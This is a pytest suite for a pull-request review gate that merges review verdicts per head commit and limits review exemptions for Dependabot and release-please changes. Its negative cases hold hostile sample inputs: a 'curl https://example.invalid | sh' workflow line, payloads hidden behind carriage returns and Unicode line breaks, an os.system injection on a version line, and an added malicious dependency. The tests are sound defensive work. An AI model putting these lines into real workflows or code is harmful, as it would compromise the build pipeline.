"""The gate's aggregation: one status per head commit, worst verdict winning.

A status is keyed by (sha, context), so two pull requests on the same head share one. The failure this
guards against is an approved pull request turning a changes-requested one green simply by being processed
last -- a merge button that lies about the pull request it is attached to.
"""

from __future__ import annotations

import importlib.util
import io
import json
import sys
from pathlib import Path

import yaml

HEAD = "195e30d8b02d5ba36e30caf889bb6bb3b1be92e2"
OTHER = "5753428684342e7e0fb38a10426a342ec61ffaaa"
BASE = "2c673bb56bf216ad60928dd9703143ac41f052ec"
REVIEWER = "review-bot[bot]"


def load_plan():
    import_path = Path(__file__).resolve().parents[1] / "scripts"
    sys.path.insert(0, str(import_path))
    spec = importlib.util.spec_from_file_location("review_gate_plan", import_path / "review_gate_plan.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


plan = load_plan()


def review(state: str, commit: str = HEAD, login: str = REVIEWER, kind: str = "Bot", association: str = "NONE"):
    return {
        "state": state,
        "commit_id": commit,
        "submitted_at": "2026-11-07T00:10:00Z",
        "author_association": association,
        "user": {"login": login, "type": kind},
    }


OLD_PIN = "a1" * 20
NEW_PIN = "b2" * 20


def uses_line(
    action: str = "actions/checkout", sha: str = NEW_PIN, comment: str = "v7.0.2", lead: str = "      - "
) -> str:
    """One workflow line as Dependabot writes it: an action pinned to a full commit, with its version comment."""
    return f"{lead}uses: {action}@{sha}  # {comment}"


def workflow_file(removed: list[str], added: list[str], name: str = ".github/workflows/ci.yml", **changes) -> dict:
    """A modified workflow as the comparison reports it, with the patch those lines make."""
    patch = (
        "@@ -20,5 +20,5 @@\n steps:\n"
        + "".join(f"-{line}\n" for line in removed)
        + "".join(f"+{line}\n" for line in added)
        + " \n"
    )
    item = {
        "filename": name,
        "previous_filename": None,
        "status": "modified",
        "additions": len(added),
        "deletions": len(removed),
        "patch": patch,
    }
    item.update(changes)
    return item


def pin_bump(count: int = 1, name: str = ".github/workflows/ci.yml", **changes) -> dict:
    """A workflow edit that only moves the pins of actions already in use: what a Dependabot update writes."""
    return workflow_file([uses_line(sha=OLD_PIN, comment="v7.0.1")] * count, [uses_line()] * count, name, **changes)


def commit(
    sha: str = HEAD, author: object = "dependabot[bot]", committer: object = "web-flow", verified: object = True
) -> dict:
    """One commit of the comparison as the gate projects it; a Dependabot commit is signed by GitHub itself."""
    return {"sha": sha, "author": author, "committer": committer, "verified": verified}


FILES = [pin_bump()]
REPOSITORY = "mikomiel/advisory-radar"
DEPENDABOT_AUTHORS = ("app/dependabot", "dependabot[bot]")
#: Marks "no branch given": the snapshot then names the branch of whoever opened the pull request, because Dependabot
#: pushes its own `dependabot/...` branch to the repository it updates. A test of the dependency exemption does not
#: have to repeat that, and a case that breaks it says so by passing a branch or a repository of its own.
BY_AUTHOR = object()


def entry(
    number: int,
    head: str = HEAD,
    reviews=(),
    draft: bool = False,
    author: str = "mikomiel",
    files: list[dict] | None = None,
    changed: int | None = None,
    base: str = BASE,
    count_head: str | None = None,
    count_base: str | None = None,
    branch: object = BY_AUTHOR,
    head_repo: object = REPOSITORY,
    base_repo: object = REPOSITORY,
    commits: list | None = None,
    total_commits: int | None = None,
) -> dict:
    chosen = FILES if files is None else files
    chosen_commits = [commit(head)] if commits is None else commits
    if branch is BY_AUTHOR:
        branch = "dependabot/uv/example" if author in DEPENDABOT_AUTHORS else "feat/example"
    return {
        "number": number,
        "head": head,
        "base": base,
        "draft": draft,
        "author": author,
        "branch": branch,
        "head_repo": head_repo,
        "base_repo": base_repo,
        "reviews": list(reviews),
        "files": chosen,
        "changed": len(chosen) if changed is None else changed,
        # A coherent snapshot: the count describes the same two commits as the comparison.
        "count_head": head if count_head is None else count_head,
        "count_base": base if count_base is None else count_base,
        "commits": chosen_commits,
        "total_commits": len(chosen_commits) if total_commits is None else total_commits,
    }


#: The repository root: the release configuration beside the scripts is what the exemption must keep matching.
ROOT = Path(__file__).resolve().parents[1]


def release_files(new: str = "0.2.0", old: str = "0.1.0") -> list[dict]:
    """The five files a generated release changes, with the one-line diff release-please writes in each.

    Captured from the estate's own generated release pull request (mikomiel/ci-burst #102, same pinned action and
    the same configuration shape): each version-carrying file replaces exactly one line, the lockfile replaces the
    ``advisory-radar`` package's own version, the changelog only gains its new section, and all versions agree.
    """
    return [
        {
            "filename": ".release-please-manifest.json",
            "previous_filename": None,
            "additions": 1,
            "deletions": 1,
            "patch": f'@@ -1,3 +1,3 @@\n {{\n-  ".": "{old}"\n+  ".": "{new}"\n }}',
        },
        {
            "filename": "CHANGELOG.md",
            "previous_filename": None,
            "additions": 3,
            "deletions": 0,
            "patch": f"@@ -9,3 +9,6 @@\n \n+## [{new}](https://example) (2026-11-13)\n+\n+* a change\n",
        },
        {
            "filename": "pyproject.toml",
            "previous_filename": None,
            "additions": 1,
            "deletions": 1,
            "patch": f'@@ -4,7 +4,7 @@\n [project]\n name = "advisory-radar"\n-version = "{old}"\n+version = "{new}"\n',
        },
        {
            "filename": "src/advisory_radar/__init__.py",
            "previous_filename": None,
            "additions": 1,
            "deletions": 1,
            "patch": f'@@ -1,3 +1,3 @@\n """advisory-radar."""\n \n-__version__ = "{old}"\n+__version__ = "{new}"\n',
        },
        {
            "filename": "uv.lock",
            "previous_filename": None,
            "additions": 1,
            "deletions": 1,
            "patch": (
                f'@@ -5,7 +5,7 @@\n [[package]]\n name = "advisory-radar"\n'
                f'-version = "{old}"\n+version = "{new}"\n source = {{ editable = "." }}\n'
            ),
        },
    ]


def release_entry(number: int = 40, **changes) -> dict:
    """The generated release pull request: the generator's branch, author, paths and version diff."""
    options = {
        "reviews": [],
        "author": plan.RELEASE_AUTHOR,
        "files": release_files(),
        "branch": plan.RELEASE_BRANCH,
        "head_repo": plan.RELEASE_REPOSITORY,
    }
    options.update(changes)
    return entry(number, **options)


def with_file(files: list[dict], name: str, **changes) -> list[dict]:
    """The release file list with one entry changed, for the negative cases."""
    return [{**item, **changes} if item["filename"] == name else item for item in files]


def decisions(entries: list[dict]) -> dict[str, tuple[str, str]]:
    return {
        head: (state, description)
        for head, state, description in plan.merge(entries, REVIEWER, "Bot", frozenset({"OWNER"}))
    }


def test_an_approved_pull_request_cannot_turn_a_change_requested_one_green():
    # the reachable bug: the status is per head, so whichever PR is processed last used to decide
    entries = [
        entry(1, reviews=[review("CHANGES_REQUESTED")]),
        entry(2, reviews=[review("APPROVED")]),
    ]
    state, description = decisions(entries)[HEAD]
    assert state == "failure"
    assert "#1" in description and "#2" in description


def test_an_approval_and_a_pending_pull_request_share_a_pending_status():
    entries = [entry(1, reviews=[review("APPROVED")]), entry(2, reviews=[])]
    assert decisions(entries)[HEAD][0] == "pending"


def test_a_single_approved_pull_request_is_success():
    assert decisions([entry(1, reviews=[review("APPROVED")])])[HEAD][0] == "success"


def test_a_draft_revokes_a_success_left_from_before_it_was_a_draft():
    entries = [entry(1, reviews=[review("APPROVED")], draft=True)]
    state, description = decisions(entries)[HEAD]
    assert state == "pending" and "draft" in description


def test_each_head_is_decided_separately():
    entries = [
        entry(1, head=HEAD, reviews=[review("APPROVED")]),
        entry(2, head=OTHER, reviews=[review("CHANGES_REQUESTED", commit=OTHER)]),
    ]
    got = decisions(entries)
    assert got[HEAD][0] == "success"
    assert got[OTHER][0] == "failure"


def test_the_stricter_verdict_is_kept_whatever_the_input_order():
    forward = decisions([entry(1, reviews=[review("APPROVED")]), entry(2, reviews=[review("CHANGES_REQUESTED")])])
    backward = decisions([entry(2, reviews=[review("CHANGES_REQUESTED")]), entry(1, reviews=[review("APPROVED")])])
    assert forward == backward
    assert forward[HEAD][0] == "failure"


def test_an_entry_without_a_head_is_ignored():
    assert decisions([{"number": 1, "reviews": []}]) == {}


def test_the_cli_prints_one_line_per_head_and_refuses_a_bad_snapshot():
    payload = json.dumps([entry(1, reviews=[review("APPROVED")])])
    printed = io.StringIO()
    real, plan.sys.stdout = plan.sys.stdout, printed
    try:
        assert plan.main(["--reviewer", REVIEWER], stdin=io.StringIO(payload)) == 0
    finally:
        plan.sys.stdout = real
    head, state, description = printed.getvalue().strip().split("\t")
    assert head == HEAD and state == "success" and "approved" in description
    assert plan.main(["--reviewer", REVIEWER], stdin=io.StringIO("{not json")) == 1
    assert plan.main(["--reviewer", REVIEWER], stdin=io.StringIO("{}")) == 1


def test_a_dependabot_update_needs_no_app_review():
    state, description = decisions([entry(17, reviews=[], author="app/dependabot", files=[pin_bump()])])[HEAD]
    assert state == "success"
    assert "not required" in description and "dependabot" in description


def test_the_other_dependabot_login_is_recognised():
    assert decisions([entry(17, reviews=[], author="dependabot[bot]")])[HEAD][0] == "success"


def test_an_ordinary_author_is_not_exempt():
    assert decisions([entry(18, reviews=[], author="mikomiel")])[HEAD][0] == "pending"


def test_a_real_verdict_wins_over_the_exemption():
    # an exemption fills the gap where nobody reviewed; it never overrules a reviewer who did
    changed = decisions([entry(17, reviews=[review("CHANGES_REQUESTED")], author="app/dependabot")])[HEAD]
    assert changed[0] == "failure"
    approved = decisions([entry(17, reviews=[review("APPROVED")], author="app/dependabot")])[HEAD]
    assert approved[0] == "success" and "approved at" in approved[1]


def test_a_draft_dependabot_update_is_still_a_draft():
    assert decisions([entry(17, reviews=[], author="app/dependabot", draft=True)])[HEAD][0] == "pending"


def test_the_exemption_can_be_disabled():
    got = plan.merge(
        [entry(17, reviews=[], author="app/dependabot")], REVIEWER, "Bot", frozenset({"OWNER"}), frozenset()
    )
    assert got[0][1] == "pending"


def test_the_exemption_needs_a_dependency_only_path_set():
    # author alone would exempt a bump that reached into src/, which automerge would then take unreviewed
    reached = decisions(
        [
            entry(
                17,
                reviews=[],
                author="app/dependabot",
                files=[pin_bump(), {"filename": "src/x.py", "previous_filename": None}],
            )
        ]
    )
    assert reached[HEAD][0] == "pending"
    missing = decisions([entry(17, reviews=[], author="app/dependabot", files=[])])
    assert missing[HEAD][0] == "pending"
    manifest = decisions(
        [
            entry(
                17,
                reviews=[],
                author="app/dependabot",
                files=[
                    {"filename": "pyproject.toml", "previous_filename": None},
                    {"filename": "uv.lock", "previous_filename": None},
                ],
            )
        ]
    )
    assert manifest[HEAD][0] == "success"


def test_a_shared_head_with_a_blocked_pull_request_stays_blocked():
    entries = [
        entry(
            17, reviews=[], author="app/dependabot", files=[{"filename": "pyproject.toml", "previous_filename": None}]
        ),
        entry(18, reviews=[], author="mikomiel", files=[{"filename": "src/x.py", "previous_filename": None}]),
    ]
    state, description = decisions(entries)[HEAD]
    assert state == "pending"
    assert "#17" in description and "#18" in description


def test_the_exemption_does_not_cover_a_stale_or_dismissed_verdict():
    """Only an absence of verdict is exempt: "approved at another commit" and "dismissed" are not reviews."""
    stale = decisions([entry(17, reviews=[review("APPROVED", commit="0" * 40)], author="app/dependabot")])[HEAD]
    assert stale[0] == "pending"
    assert "not required" not in stale[1]
    dismissed = decisions([entry(17, reviews=[review("DISMISSED")], author="app/dependabot")])[HEAD]
    assert dismissed[0] == "pending"


def test_a_renamed_source_counts_against_the_exemption():
    # the comparison names both sides of a rename; only ``filename`` would let src/x.py become pyproject.toml
    renamed = decisions(
        [
            entry(
                17,
                reviews=[],
                author="app/dependabot",
                files=[{"filename": "pyproject.toml", "previous_filename": "src/x.py"}],
            )
        ]
    )
    assert renamed[HEAD][0] == "pending"


def test_a_nested_path_under_a_manifest_name_is_not_a_dependency_update():
    # deleting Dockerfile and adding Dockerfile/evil.py must not read as a manifest-only change
    nested = decisions(
        [
            entry(
                17,
                reviews=[],
                author="app/dependabot",
                files=[{"filename": "Dockerfile/evil.py", "previous_filename": None}],
            )
        ]
    )
    assert nested[HEAD][0] == "pending"
    for name in ("pyproject.toml/evil.py", "uv.lock/evil.py", "docker-compose.yml/evil.py"):
        got = decisions(
            [entry(17, reviews=[], author="app/dependabot", files=[{"filename": name, "previous_filename": None}])]
        )
        assert got[HEAD][0] == "pending", name


def test_a_truncated_comparison_is_not_exempt():
    # compare caps its list at 300: a source file can hide past the cap, so a short list proves nothing
    entry_with_short_list = entry(
        17,
        reviews=[],
        author="app/dependabot",
        files=[{"filename": "pyproject.toml", "previous_filename": None}],
        changed=5,
    )
    assert decisions([entry_with_short_list])[HEAD][0] == "pending"


def test_a_count_from_another_commit_pair_is_not_exempt():
    """The count and the comparison are two reads: a branch that moved between them proves nothing.

    Pairing the pinned comparison of head A (truncated at the comparison cap) with the smaller count of a
    newer head B would let an omitted source path pass the short-list check that exists to catch it.
    """
    files = [{"filename": "pyproject.toml", "previous_filename": None}]
    coherent = entry(17, reviews=[], author="app/dependabot", files=files, changed=1)
    assert decisions([coherent])[HEAD][0] == "success"
    moved_head = entry(17, reviews=[], author="app/dependabot", files=files, changed=1, count_head=OTHER)
    assert decisions([moved_head])[HEAD][0] == "pending"
    moved_base = entry(17, reviews=[], author="app/dependabot", files=files, changed=1, count_base="0" * 40)
    assert decisions([moved_base])[HEAD][0] == "pending"


def test_a_comment_holds_a_dependency_update():
    # any review at all is used as-is; a comment is not an approval
    commented = decisions([entry(17, reviews=[review("COMMENTED")], author="app/dependabot")])[HEAD]
    assert commented[0] == "pending"


def dependabot_state(**changes) -> str:
    return decisions([entry(17, reviews=[], author="dependabot[bot]", **changes)])[HEAD][0]


def test_the_exemption_reads_every_commit_not_only_who_opened_the_pull_request():
    """The author is whoever opened the pull request, and a branch takes more commits afterwards.

    A maintainer who pushes to a Dependabot branch leaves the pull request's author unchanged, so the exemption
    must look at the commits themselves: each one the exempt author's own, and signed by GitHub.
    """
    cases = {
        "a commit by a maintainer": [commit(OTHER), commit(HEAD, author="mikomiel")],
        # an author is only an email address; the signature is checked against the committer, so a person's own
        # signed commit can carry the bot's name as its author and still read as verified
        "a maintainer's signature under the bot's name": [commit(HEAD, committer="mikomiel")],
        "an unsigned commit": [commit(HEAD, verified=False)],
        "a signature the API did not report": [commit(HEAD, verified=None)],
        "a string where the verdict belongs": [commit(HEAD, verified="true")],
        "an author GitHub could not resolve": [commit(HEAD, author=None)],
        "a committer GitHub could not resolve": [commit(HEAD, committer=None)],
        "an author that is not a name": [commit(HEAD, author=["dependabot[bot]"])],
        "no commits": [],
        "a list that does not carry the head": [commit(OTHER)],
        "an item that is not a commit": [commit(OTHER), "dependabot[bot]", commit(HEAD)],
        "a commit without an id": [{"author": "dependabot[bot]", "committer": "web-flow", "verified": True}],
    }
    for label, commits in cases.items():
        assert dependabot_state(commits=commits) == "pending", label


def test_a_commit_list_shorter_than_the_comparison_proves_nothing():
    # compare lists at most 250 commits, so a short list can hide a later commit by somebody else
    assert dependabot_state(commits=[commit(HEAD)], total_commits=2) == "pending"
    assert dependabot_state(commits=[commit(HEAD)], total_commits=251) == "pending"
    # a count that is absent, null or not a number cannot show the list complete; a boolean is not a number
    absent = entry(17, reviews=[], author="dependabot[bot]")
    del absent["total_commits"]
    assert decisions([absent])[HEAD][0] == "pending"
    for count in (None, "1", 1.0, True):
        counted = {**entry(17, reviews=[], author="dependabot[bot]"), "total_commits": count}
        assert decisions([counted])[HEAD][0] == "pending", repr(count)


def test_a_snapshot_without_commits_cannot_be_exempt():
    # an entry from before the commits were carried must fail closed, not be read as an empty, harmless list
    legacy = entry(17, reviews=[], author="dependabot[bot]")
    del legacy["commits"], legacy["total_commits"]
    assert decisions([legacy])[HEAD][0] == "pending"
    # and a value that is not a list is refused, not iterated or measured: one bad entry must not stop the plan
    for odd in (None, "abc", {"sha": HEAD}, 5):
        broken = {**entry(17, reviews=[], author="dependabot[bot]"), "commits": odd, "total_commits": 1}
        assert decisions([broken])[HEAD][0] == "pending", repr(odd)


def test_a_dependabot_update_of_signed_commits_is_exempt():
    assert dependabot_state(commits=[commit(OTHER), commit(HEAD)]) == "success"
    # a committer that is the exempt author itself is as good as the one GitHub records for its own signature
    assert dependabot_state(commits=[commit(HEAD, committer="dependabot[bot]")]) == "success"
    assert decisions([entry(17, reviews=[], author="app/dependabot", commits=[commit(HEAD)])])[HEAD][0] == "success"


def test_a_dependabot_update_must_come_from_a_dependabot_branch_of_this_repository():
    """Dependabot pushes `dependabot/...` branches to the repository it updates, so the exemption asks for that shape.

    This narrows what qualifies. It does not authenticate the bot: see the documentation test below.
    """
    assert dependabot_state() == "success"
    cases = {
        "a branch of any other name": {"branch": "feat/example"},
        "the prefix in the middle of the name": {"branch": "feat/dependabot/example"},
        "the prefix without its slash": {"branch": "dependabot-example"},
        "the prefix in another case": {"branch": "Dependabot/uv/example"},
        "no branch": {"branch": None},
        "a branch that is not a name": {"branch": ["dependabot/uv/example"]},
        "a head in a fork": {"head_repo": "someone/advisory-radar"},
        "a head whose repository is gone": {"head_repo": ""},
        "a head repository that is not a name": {"head_repo": None},
        "a base repository that is unknown": {"base_repo": ""},
        "a base repository that is not a name": {"base_repo": None},
        "two repositories that are both unknown": {"head_repo": "", "base_repo": ""},
        "two repositories that are both missing": {"head_repo": None, "base_repo": None},
    }
    for label, change in cases.items():
        assert dependabot_state(**change) == "pending", label
    # a snapshot from before the base repository travelled with it must fail closed, not be read as a match
    legacy = entry(17, reviews=[], author="dependabot[bot]")
    del legacy["base_repo"]
    assert decisions([legacy])[HEAD][0] == "pending"
    # the other login is held to the same shape
    assert decisions([entry(17, reviews=[], author="app/dependabot", branch="feat/example")])[HEAD][0] == "pending"


def test_the_documentation_states_the_conditions_of_the_dependency_exemption_and_what_they_do_not_prove():
    """The comment on the signing committer once claimed more than the check shows; the page must not repeat it.

    A squash merge of a Dependabot pull request is written by GitHub as the pull request's author, committed and
    signed by GitHub, whatever the merged branch held. Every identity condition passes for such a commit, so the
    exemption trusts people with write access and says so.
    """
    docs = (ROOT / "docs" / "review-and-merge.md").read_text()
    bullet = docs.split("**Dependency updates are exempt from the App review.**", 1)[1].split("\n- ", 1)[0]
    for fact in ("`dependabot/`", "not a fork's", "squash merge", "people with write access are trusted"):
        assert fact in bullet, f"the dependency exemption is documented without {fact!r}"


def test_dependabot_names_its_branches_with_the_prefix_that_the_exemption_asks_for():
    """Dependabot joins the parts of a branch name with ``/`` unless an update sets its own separator.

    A different separator would name every branch ``dependabot-...``, and the exemption would end for every update
    without a failing check: the planner fails closed on a branch that lacks its prefix.
    """
    assert plan.DEPENDABOT_BRANCH_PREFIX == "dependabot/"
    updates = yaml.safe_load((ROOT / ".github" / "dependabot.yml").read_text())["updates"]
    assert updates
    for update in updates:
        separator = (update.get("pull-request-branch-name") or {}).get("separator", "/")
        assert separator == "/", f"{update['package-ecosystem']}: its branches would not start with the prefix"


def test_the_contributor_guide_describes_the_exemptions_and_the_latest_tag_as_they_are():
    """CONTRIBUTING.md repeats two facts that other files own, and each had drifted from its owner.

    The Dependabot exemption is no longer "touches only manifests" (docs/review-and-merge.md and the planner own
    its conditions), and ``latest`` moves only for the highest stable tag that is a release of main, one that passes
    the ancestry and version checks of the release itself (release.yml owns that rule; the guide points at the page
    that describes it).
    """
    guide = " ".join((ROOT / "CONTRIBUTING.md").read_text().split())
    assert "touches only manifests" not in guide, "the Dependabot exemption is described as manifests only"
    assert "exempt Dependabot manifest change" not in guide
    assert "`dependabot/` branch of this repository" in guide
    rule = "only when the tag is the highest stable `vX.Y.Z` tag that is a release of `main`"
    assert rule in guide, "the guide leaves out that `latest` needs a tag that is a release of main"
    assert "(docs/review-and-merge.md#release-tags)" in guide, "the guide does not point at the `latest` rule"
    docs = (ROOT / "docs" / "review-and-merge.md").read_text()
    assert "\n## Release tags\n" in docs, "the guide links to a section that review-and-merge.md no longer has"
    release = (ROOT / ".github" / "workflows" / "release.yml").read_text()
    assert "highest stable" in release, "release.yml no longer applies the rule that the guide describes"


def test_a_workflow_edit_that_only_moves_pins_is_exempt():
    several = [pin_bump(count=3), pin_bump(count=2, name=".github/workflows/release.yml")]
    assert dependabot_state(files=several) == "success"
    nested = workflow_file(
        [uses_line(action="github/codeql-action/analyze", sha=OLD_PIN, comment="v3.27.0", lead="        ")],
        [uses_line(action="github/codeql-action/analyze", comment="v3.28.0", lead="        ")],
    )
    assert dependabot_state(files=[nested]) == "success"
    # a manifest beside the workflow needs no patch: only the workflow tree is held to the pin shape
    assert dependabot_state(files=[{"filename": "uv.lock", "previous_filename": None}, pin_bump()]) == "success"


def test_a_workflow_edit_that_is_more_than_a_pin_keeps_the_review_requirement():
    """The path says only that a workflow changed; the patch says what it can now do."""
    old, new = uses_line(sha=OLD_PIN, comment="v7.0.1"), uses_line()
    cases = {
        "a run line": workflow_file(["      run: echo ok"], ["      run: curl https://example.invalid | sh"]),
        "a with line": workflow_file(["          fetch-depth: 0"], ["          fetch-depth: 1"]),
        "a permission": workflow_file(["  contents: read"], ["  contents: write"]),
        "a second line beside the pin": workflow_file([old], [new, "      - run: echo extra"]),
        "a dropped pin": workflow_file([old], []),
        "another action": workflow_file([old], [uses_line(action="someone/checkout")]),
        "a mutable tag": workflow_file([old], ["      - uses: actions/checkout@v8"]),
        "a short commit id": workflow_file([old], [uses_line(sha="b2" * 10)]),
        "an indentation that moved": workflow_file([old], [uses_line(lead="    - ")]),
        "a list marker that appeared": workflow_file([uses_line(sha=OLD_PIN, lead="        ")], [new]),
        "a comment line that names an action": workflow_file(["      # " + old.strip()], ["      # " + new.strip()]),
        # A YAML parser reads these as the end of the line; git does not. The fragment after the break starts with a
        # space so that a splitter which broke here too would take it for a context line and let it through.
        "a carriage return in the comment": workflow_file(
            [old], [uses_line(comment="v7.0.2\r      run: curl https://example.invalid | sh")]
        ),
        "a unicode line break in the comment": workflow_file([old], [uses_line(comment="v7.0.2\u2028      run: id")]),
        "a next-line character in the comment": workflow_file([old], [uses_line(comment="v7.0.2\x85      run: id")]),
        "a tab in the comment": workflow_file([old], [uses_line(comment="v7.0.2\trun: id")]),
        "counts that do not match the patch": workflow_file([old], [new, new], additions=1),
        "an addition the patch hides": workflow_file([old], [new], additions=2),
        "a count of zero": workflow_file([], [], additions=0, deletions=0),
        "a patch with a stray line": {**pin_bump(), "patch": pin_bump()["patch"] + "run: id\n"},
        "no patch carried": pin_bump(patch=None),
        "a patch that is not text": pin_bump(patch=["+x"]),
        "a new file": pin_bump(status="added"),
        "a removed file": pin_bump(status="removed"),
        "no status": {key: value for key, value in pin_bump().items() if key != "status"},
        "a renamed file": pin_bump(status="renamed", previous_filename=".github/workflows/old.yml"),
        "a modified file that names a previous one": pin_bump(previous_filename=".github/workflows/old.yml"),
        # the new name is a manifest, so only the old name puts the workflow tree in play
        "a workflow renamed onto a manifest name": {
            "filename": "uv.lock",
            "previous_filename": ".github/workflows/ci.yml",
            "status": "renamed",
            "additions": 1,
            "deletions": 1,
            "patch": pin_bump()["patch"],
        },
        "a removal written after its addition": {
            **pin_bump(),
            "patch": f"@@ -20,5 +20,5 @@\n steps:\n+{new}\n-{old}\n",
        },
        "a bare path": {"filename": ".github/workflows/ci.yml", "previous_filename": None},
    }
    for label, item in cases.items():
        assert dependabot_state(files=[item]) == "pending", label
    # one unproven workflow among proven ones is enough
    assert dependabot_state(files=[pin_bump(), cases["a run line"]]) == "pending"


def test_the_generated_release_pull_request_needs_no_app_review():
    state, description = decisions([release_entry()])[HEAD]
    assert state == "success"
    assert "release" in description and "not required" in description


def test_a_change_request_still_blocks_the_generated_release_pull_request():
    # the exemption removes the approval requirement, not a veto
    assert decisions([release_entry(reviews=[review("CHANGES_REQUESTED")])])[HEAD][0] == "failure"


def test_an_approval_at_the_head_is_reported_as_that_approval():
    # the exemption fills the gap; it does not rewrite a verdict that is already there
    state, description = decisions([release_entry(reviews=[review("APPROVED")])])[HEAD]
    assert state == "success" and "approved at" in description


def test_a_stale_approval_or_a_dismissal_does_not_block_the_generated_release():
    # release-please rewrites its branch on every run, so a review left on the previous head must not park it
    for reviews in ([review("APPROVED", commit="0" * 40)], [review("DISMISSED")], [review("COMMENTED")]):
        got = decisions([release_entry(reviews=reviews)])[HEAD]
        assert got[0] == "success" and "not required" in got[1]


def test_every_other_identity_keeps_the_review_requirement():
    cases = {
        "another branch": {"branch": "release-please--branches--main--components--other"},
        "a consolidated branch": {"branch": "release-please--branches--main"},
        "a fork's head": {"head_repo": "someone/advisory-radar"},
        "another author": {"author": "contributor"},
        "a draft": {"draft": True},
        "no file list": {"files": []},
        "a truncated list": {"files": release_files()[:1], "changed": len(release_files())},
        "a count from another commit pair": {"count_head": OTHER},
    }
    for label, change in cases.items():
        assert decisions([release_entry(**change)])[HEAD][0] == "pending", label


def test_a_release_that_is_not_only_the_version_bump_keeps_the_review_requirement():
    """The exemption proves the content, not just the names: a hand-written edit inside an allowed file fails."""
    files = release_files()
    cases = {
        "a dependency beside the version": with_file(
            files,
            "pyproject.toml",
            additions=2,
            patch=(
                '@@ -4,8 +4,9 @@\n [project]\n name = "advisory-radar"\n-version = "0.1.0"\n'
                '+version = "0.2.0"\n+    "evil-package>=1.0",\n'
            ),
        ),
        "an import on the version line": with_file(
            files,
            "src/advisory_radar/__init__.py",
            patch=(
                '@@ -1,3 +1,3 @@\n """advisory-radar."""\n \n-__version__ = "0.1.0"\n'
                '+__version__ = "0.2.0"; __import__("os").system("id")\n'
            ),
        ),
        "a carriage return in the version line": with_file(
            files,
            "src/advisory_radar/__init__.py",
            # A Python parser reads a bare carriage return as a newline, but str.splitlines would hide the second
            # statement from the content check: the patch must be split on LF only.
            patch=(
                '@@ -1,3 +1,3 @@\n """advisory-radar."""\n \n-__version__ = "0.1.0"\n'
                '+__version__ = "0.2.0"\rprint("unexpected executable code")\n'
            ),
        ),
        "two changed lines": with_file(files, "pyproject.toml", additions=2, deletions=2),
        "no patch carried": with_file(files, "pyproject.toml", patch=None),
        "the version unchanged": release_files(new="0.1.0"),
        "versions that disagree": with_file(
            files,
            "pyproject.toml",
            patch='@@ -4,7 +4,7 @@\n [project]\n name = "advisory-radar"\n-version = "0.1.0"\n+version = "0.9.9"\n',
        ),
        "no changelog section": [item for item in files if item["filename"] != "CHANGELOG.md"],
        "an extra path": files + [{"filename": "docs/sources.md", "previous_filename": None}],
        "a renamed file": with_file(files, "pyproject.toml", previous_filename="docs/pyproject.toml"),
        "a changelog that gained nothing": with_file(files, "CHANGELOG.md", additions=0),
        "a lockfile dependency version": with_file(
            files,
            "uv.lock",
            patch=(
                '@@ -20,7 +20,7 @@\n [[package]]\n name = "fastapi"\n'
                '-version = "0.1.0"\n+version = "0.2.0"\n source = { registry = "https://pypi.org/simple" }\n'
            ),
        ),
        "a lockfile line with no package context": with_file(
            files,
            "uv.lock",
            patch='@@ -7,1 +7,1 @@\n-version = "0.1.0"\n+version = "0.2.0"\n',
        ),
        "a lockfile that disagrees": with_file(
            files,
            "uv.lock",
            patch=(
                '@@ -5,7 +5,7 @@\n [[package]]\n name = "advisory-radar"\n'
                '-version = "0.1.0"\n+version = "0.9.9"\n source = { editable = "." }\n'
            ),
        ),
        "no lockfile": [item for item in files if item["filename"] != "uv.lock"],
    }
    for label, changed in cases.items():
        assert decisions([release_entry(files=changed, changed=len(changed))])[HEAD][0] == "pending", label


def test_the_release_shape_follows_the_release_configuration():
    """The exemption's literals mirror two files; a drift in either must fail here, not silently stop matching."""
    config = json.loads((ROOT / "release-please-config.json").read_text(encoding="utf-8"))
    package = config["packages"]["."]
    assert f"release-please--branches--main--components--{package['package-name']}" == plan.RELEASE_BRANCH
    extra = package.get("extra-files")
    assert isinstance(extra, list) and len(extra) == 1, "one extra file: the lockfile"
    assert extra[0]["type"] == "toml" and extra[0]["path"] == "uv.lock"
    assert plan.RELEASE_PACKAGE in extra[0]["jsonpath"], "the bump must target this package, not a dependency"
    assert package["package-name"] == plan.RELEASE_PACKAGE
    assert {item["filename"] for item in release_files()} == plan.RELEASE_PATHS
    # The tag is `vX.Y.Z` because release.yml triggers on that and ignores a component prefix.
    assert config["include-v-in-tag"] is True
    assert config["include-component-in-tag"] is False
    # One root package, so the release pull request changes the root files the exemption names.
    assert list(json.loads((ROOT / ".release-please-manifest.json").read_text(encoding="utf-8"))) == ["."]
    assert {"pyproject.toml", "src/advisory_radar/__init__.py", "CHANGELOG.md"} <= plan.RELEASE_PATHS


def test_the_release_exemption_names_the_token_owner_and_the_observed_generator_branch():
    # Literals on purpose: the branch is what release-please produced for this estate at the pinned action version
    # (mikomiel/ci-burst #102, same configuration shape), and the author is the account behind the token.
    assert plan.RELEASE_BRANCH == "release-please--branches--main--components--advisory-radar"
    assert plan.RELEASE_AUTHOR == "mikomiel"
    assert plan.RELEASE_REPOSITORY == "mikomiel/advisory-radar"
